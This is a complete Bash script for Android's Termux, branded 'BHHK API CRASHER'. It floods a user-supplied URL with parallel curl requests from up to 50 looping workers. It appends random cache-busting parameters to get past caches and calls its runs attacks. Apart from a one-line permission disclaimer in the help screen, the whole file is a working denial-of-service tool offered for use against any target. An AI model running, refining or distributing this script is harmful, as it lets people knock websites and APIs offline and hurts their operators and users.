#!/data/data/com.termux/files/usr/bin/bash
# ============================================================
# BHHK API CRASHER v3.0 — Mobile Safe Edition
# ============================================================

CYAN='\033[0;36m'
PINK='\033[0;35m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
WHITE='\033[1;37m'
DIM='\033[2m'
BOLD='\033[1m'
NC='\033[0m'

# Working directory (Termux safe — no /tmp)
WORK_DIR="$HOME/.bhhk_crasher"
mkdir -p "$WORK_DIR"
rm -f "$WORK_DIR"/w*.log 2>/dev/null

TARGET_URL=""
THREADS=10
TIMEOUT=8
TOTAL=0
OK=0
ERR=0
RUNNING=0

# ============================================================
# CLEANUP
# ============================================================
cleanup() {
    printf '\033[?25h'
    RUNNING=0
    rm -f "$WORK_DIR/run.flag" 2>/dev/null
    pkill -f "bhhk_worker_" 2>/dev/null
    echo ""
    echo -e "${YELLOW}  ⏹ Session ended${NC}"
    exit 0
}
trap cleanup INT TERM

# ============================================================
# BANNER
# ============================================================
show_banner() {
    clear
    echo ""
    echo -e "${CYAN}    ╔══════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}    ║${NC}  ${PINK}⚡  B H H K   A P I   C R A S H E R  ⚡${NC}  ${CYAN}║${NC}"
    echo -e "${CYAN}    ║${NC}      ${DIM}BHHK TEAMS Stress Engine v3.0${NC}      ${CYAN}║${NC}"
    echo -e "${CYAN}    ╚══════════════════════════════════════════╝${NC}"
    echo ""
}

# ============================================================
# BOOT ANIMATION
# ============================================================
boot_animation() {
    clear
    echo ""
    echo -e "${CYAN}    ╔══════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}    ║${NC}  ${PINK}⚡  B H H K   A P I   C R A S H E R  ⚡${NC}  ${CYAN}║${NC}"
    echo -e "${CYAN}    ║${NC}      ${DIM}BHHK TEAMS Stress Engine v3.0${NC}      ${CYAN}║${NC}"
    echo -e "${CYAN}    ╚══════════════════════════════════════════╝${NC}"
    echo ""

    local steps=(
        "Initializing core"
        "Loading network engine"
        "Calibrating workers"
        "Preparing terminal"
        "Ready"
    )

    for i in "${!steps[@]}"; do
        local progress=$(( (i + 1) * 100 / ${#steps[@]} ))
        local filled=$(( progress / 5 ))
        local bar=""
        for ((j=0; j<20; j++)); do
            if [ $j -lt $filled ]; then
                bar="${bar}█"
            else
                bar="${bar}░"
            fi
        done
        printf "\r  ${CYAN}▸${NC} ${WHITE}%-24s${NC} ${PINK}[${bar}]${NC} ${GREEN}%3d%%${NC}" \
            "${steps[$i]}" "$progress"
        sleep 0.25
    done
    echo ""
    echo ""
    sleep 0.4
}

# ============================================================
# WORKER PROCESS
# ============================================================
worker() {
    local wid=$1
    local url=$2
    local wlog="$WORK_DIR/w${wid}.log"

    while [ -f "$WORK_DIR/run.flag" ]; do
        local rnd=$(head -c 8 /dev/urandom | od -An -tx1 | tr -d ' \n')
        local sep="?"
        case "$url" in *\?*) sep="&";; esac
        local final_url="${url}${sep}_cb=${rnd}"

        local start_ms=$(date +%s%N)
        local http_code=$(curl -s -o /dev/null -w "%{http_code}" \
            --max-time "$TIMEOUT" \
            --connect-timeout 5 \
            -A "Mozilla/5.0 (Linux; Android) BHHK/3.0" \
            -H "Cache-Control: no-cache" \
            "$final_url" 2>/dev/null)
        local end_ms=$(date +%s%N)
        local latency=$(( (end_ms - start_ms) / 1000000 ))

        if [ -z "$http_code" ] || [ "$http_code" = "000" ]; then
            echo "ERR|${wid}|${latency}|TIMEOUT" >> "$wlog"
        elif [ "$http_code" -ge 200 ] && [ "$http_code" -lt 400 ]; then
            echo "OK|${wid}|${latency}|${http_code}" >> "$wlog"
        else
            echo "ERR|${wid}|${latency}|${http_code}" >> "$wlog"
        fi

        sleep 0.02
    done
    rm -f "$wlog" 2>/dev/null
    exit 0
}

# ============================================================
# LIVE ATTACK — all logic in one loop
# ============================================================
run_attack() {
    # Reset
    TOTAL=0
    OK=0
    ERR=0
    RUNNING=1

    # Clean old logs
    rm -f "$WORK_DIR"/w*.log "$WORK_DIR/run.flag" 2>/dev/null
    for i in $(seq 1 $THREADS); do
        : > "$WORK_DIR/w${i}.log"
    done
    touch "$WORK_DIR/run.flag"

    # Clear screen and print header
    clear
    echo ""
    echo -e "${CYAN}  ╔══════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}  ║${NC}  ${PINK}⚡ BHHK API CRASHER — LIVE ⚡${NC}          ${CYAN}║${NC}"
    echo -e "${CYAN}  ╚══════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${DIM}Target :${NC} ${WHITE}${TARGET_URL}${NC}"
    echo -e "  ${DIM}Threads:${NC} ${WHITE}${THREADS}${NC}   ${DIM}Timeout:${NC} ${WHITE}${TIMEOUT}s${NC}"
    echo ""
    echo -e "  ${CYAN}▸${NC} ${GREEN}OK:${WHITE}0${NC}  ${RED}ERR:${WHITE}0${NC}  ${PINK}TOTAL:${WHITE}0${NC}  ${CYAN}RATE:${WHITE}0/s${NC}"
    echo -e "  ${DIM}──────────────────────────────────────────${NC}"
    echo ""

    printf '\033[?25l'

    # Spawn workers
    for i in $(seq 1 $THREADS); do
        worker "$i" "$TARGET_URL" &
    done

    # Live loop — reads worker logs, prints, updates stats
    local rate_count=0
    local rate_time=$(date +%s)
    local rate=0
    local stat_line=8  # line number where status bar is

    while [ -f "$WORK_DIR/run.flag" ]; do
        local new_lines=0

        for wlog in "$WORK_DIR"/w*.log; do
            [ -f "$wlog" ] || continue
            [ -s "$wlog" ] || continue

            while IFS='|' read -r status wid latency code; do
                [ -z "$status" ] && continue

                TOTAL=$((TOTAL + 1))
                local t=$(date +%H:%M:%S)

                if [ "$status" = "OK" ]; then
                    OK=$((OK + 1))
                    printf "  ${DIM}%s${NC} ${GREEN}[OK]${NC}  ${WHITE}W%-2s${NC} ${CYAN}%5sms${NC} ${DIM}%s${NC}\n" \
                        "$t" "$wid" "$latency" "$code"
                else
                    ERR=$((ERR + 1))
                    printf "  ${DIM}%s${NC} ${RED}[ERR]${NC} ${WHITE}W%-2s${NC} ${YELLOW}%5sms${NC} ${DIM}%s${NC}\n" \
                        "$t" "$wid" "$latency" "$code"
                fi
                new_lines=$((new_lines + 1))
                rate_count=$((rate_count + 1))
            done < "$wlog"

            > "$wlog"
        done

        # Calculate rate
        local now=$(date +%s)
        if [ $((now - rate_time)) -ge 1 ]; then
            rate=$rate_count
            rate_count=0
            rate_time=$now
        fi

        # Update status bar only when new lines arrived
        if [ "$new_lines" -gt 0 ]; then
            printf "\033[s"                          # save cursor
            printf "\033[${stat_line};1H"            # move to status line
            printf "\033[K"                          # clear line
            printf "  ${CYAN}▸${NC} ${GREEN}OK:${WHITE}%-5d${NC} ${RED}ERR:${WHITE}%-4d${NC} ${PINK}TOTAL:${WHITE}%-6d${NC} ${CYAN}RATE:${WHITE}%d/s${NC}" \
                "$OK" "$ERR" "$TOTAL" "$rate"
            printf "\033[u"                          # restore cursor
        fi

        sleep 0.12
    done

    printf '\033[?25h'
    rm -f "$WORK_DIR/run.flag" 2>/dev/null

    # Small wait for workers to die
    sleep 0.5

    # Summary
    echo ""
    echo ""
    echo -e "  ${CYAN}╔══════════════════════════════════════════╗${NC}"
    echo -e "  ${CYAN}║${NC}   ${YELLOW}⏹  ATTACK STOPPED${NC}                      ${CYAN}║${NC}"
    echo -e "  ${CYAN}╚══════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${GREEN}▸ Success:${NC}  ${WHITE}${OK}${NC}"
    echo -e "  ${RED}▸ Failed:${NC}   ${WHITE}${ERR}${NC}"
    echo -e "  ${PINK}▸ Total:${NC}    ${WHITE}${TOTAL}${NC}"
    echo ""
}

# ============================================================
# START MENU → run attack
# ============================================================
start_crasher() {
    show_banner

    echo -e "  ${CYAN}▸${NC} ${WHITE}Enter target API URL${NC}"
    echo -e "  ${DIM}  Example: api.example.com/v1/data${NC}"
    printf "  ${PINK}➜${NC} "
    read -r TARGET_URL

    if [ -z "$TARGET_URL" ]; then
        echo -e "\n  ${RED}✗ URL required${NC}"
        sleep 1
        return
    fi

    case "$TARGET_URL" in
        http://*|https://*) ;;
        *) TARGET_URL="https://${TARGET_URL}" ;;
    esac

    echo ""
    echo -e "  ${CYAN}▸${NC} ${WHITE}Select thread count${NC}"
    echo -e "    ${PINK}[1]${NC} ${WHITE}10 threads${NC}   ${DIM}(light)${NC}"
    echo -e "    ${PINK}[2]${NC} ${WHITE}25 threads${NC}   ${DIM}(medium)${NC}"
    echo -e "    ${PINK}[3]${NC} ${WHITE}50 threads${NC}   ${DIM}(heavy)${NC}"
    printf "  ${PINK}➜${NC} "
    read -r th

    case "$th" in
        2) THREADS=25 ;;
        3) THREADS=50 ;;
        *) THREADS=10 ;;
    esac

    echo ""
    echo -e "  ${YELLOW}⚠  Starting in 3 seconds (Ctrl+C to abort)${NC}"
    sleep 1
    printf "  ${CYAN}3...${NC}\n"; sleep 1
    printf "  ${CYAN}2...${NC}\n"; sleep 1
    printf "  ${CYAN}1...${NC}\n"; sleep 1

    run_attack

    printf "  ${DIM}Press ENTER to return...${NC}"
    read -r
}

# ============================================================
# STATS
# ============================================================
show_stats() {
    show_banner
    echo -e "  ${CYAN}╔══════════════════════════════════════════╗${NC}"
    echo -e "  ${CYAN}║${NC}   ${PINK}📊 SESSION STATISTICS${NC}                  ${CYAN}║${NC}"
    echo -e "  ${CYAN}╚══════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${CYAN}▸${NC} ${WHITE}Last Target:${NC}  ${PINK}${TARGET_URL:-N/A}${NC}"
    echo -e "  ${CYAN}▸${NC} ${WHITE}Threads:${NC}      ${PINK}${THREADS}${NC}"
    echo -e "  ${CYAN}▸${NC} ${GREEN}Success:${NC}      ${WHITE}${OK}${NC}"
    echo -e "  ${CYAN}▸${NC} ${RED}Failed:${NC}       ${WHITE}${ERR}${NC}"
    echo -e "  ${CYAN}▸${NC} ${PINK}Total:${NC}        ${WHITE}${TOTAL}${NC}"
    echo ""
    if [ "$TOTAL" -gt 0 ]; then
        local rate=$(( OK * 100 / TOTAL ))
        echo -e "  ${CYAN}▸${NC} ${WHITE}Success Rate:${NC} ${GREEN}${rate}%${NC}"
    fi
    echo ""
    printf "  ${DIM}Press ENTER to continue...${NC}"
    read -r
}

# ============================================================
# HELP
# ============================================================
show_help() {
    show_banner
    echo -e "  ${CYAN}╔══════════════════════════════════════════╗${NC}"
    echo -e "  ${CYAN}║${NC}   ${PINK}📖 HELP / INFO${NC}                        ${CYAN}║${NC}"
    echo -e "  ${CYAN}╚══════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${WHITE}${BOLD}How to use:${NC}"
    echo -e "  ${CYAN}1.${NC} Select ${PINK}START${NC}"
    echo -e "  ${CYAN}2.${NC} Enter target URL"
    echo -e "  ${CYAN}3.${NC} Choose threads"
    echo -e "  ${CYAN}4.${NC} Watch live log"
    echo -e "  ${CYAN}5.${NC} Press ${PINK}Ctrl+C${NC} to stop"
    echo ""
    echo -e "  ${WHITE}${BOLD}Thread Guide:${NC}"
    echo -e "  ${CYAN}▸${NC} 10 — Light load"
    echo -e "  ${CYAN}▸${NC} 25 — Medium load"
    echo -e "  ${CYAN}▸${NC} 50 — Heavy load"
    echo ""
    echo -e "  ${YELLOW}⚠  Only test APIs you own or have permission for${NC}"
    echo ""
    printf "  ${DIM}Press ENTER to continue...${NC}"
    read -r
}

# ============================================================
# MAIN MENU
# ============================================================
main_menu() {
    while true; do
        show_banner
        echo -e "  ${CYAN}╭──────────────────────────────────────────╮${NC}"
        echo -e "  ${CYAN}│${NC}  ${PINK}[1]${NC} ${WHITE}⚡  START CRASHER${NC}                     ${CYAN}│${NC}"
        echo -e "  ${CYAN}│${NC}  ${PINK}[2]${NC} ${WHITE}📊  STATISTICS${NC}                        ${CYAN}│${NC}"
        echo -e "  ${CYAN}│${NC}  ${PINK}[3]${NC} ${WHITE}📖  HELP / INFO${NC}                       ${CYAN}│${NC}"
        echo -e "  ${CYAN}│${NC}  ${PINK}[0]${NC} ${WHITE}🚪  EXIT${NC}                              ${CYAN}│${NC}"
        echo -e "  ${CYAN}╰──────────────────────────────────────────╯${NC}"
        echo ""
        printf "  ${PINK}➜${NC} ${WHITE}Select option:${NC} "
        read -r choice
        echo ""

        case "$choice" in
            1) start_crasher ;;
            2) show_stats ;;
            3) show_help ;;
            0) cleanup ;;
            *) echo -e "  ${RED}✗ Invalid option${NC}"; sleep 1 ;;
        esac
    done
}

# ============================================================
# ENTRY
# ============================================================
boot_animation
main_menu